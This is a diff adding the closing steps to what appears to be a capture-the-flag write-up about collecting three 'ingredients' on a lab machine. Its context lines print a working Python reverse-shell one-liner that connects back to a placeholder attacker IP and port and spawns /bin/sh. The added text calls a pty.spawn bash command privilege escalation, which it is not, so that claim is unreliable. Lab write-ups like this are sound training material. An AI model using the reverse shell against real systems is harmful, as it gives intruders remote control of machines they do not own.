@@ -128,10 +128,21 @@ At this point, we can continue to issue commands to the web browser panel.  Howe
 
 \`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("\[YOUR IP]",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/sh","-i"]);'\`
 
-
 on the control panel, and was able to spawn the reverse shell:
 
 ![](/images/a_shell_open.png)
 
 Now we can explore the machine and look for our next ingredient:
+
+![](/images/a_shell_second.png)
+
+Awesome.  That's the second ingredient, and we only have one left.  Unfortunately, the last one needs root access, so let's practice our privilege escalation.  I'll use another python script to sudo bash:
+
+\`python3 -c 'import pty; pty.spawn("/bin/bash")'\`
+
+Now we can cd to /root, and get into the third ingredient:
+
+![](/images/a_shell_last.png)
+
+That's it! We got all three ingredients.  Enter them for your points, and I'll see you in the next room.
 
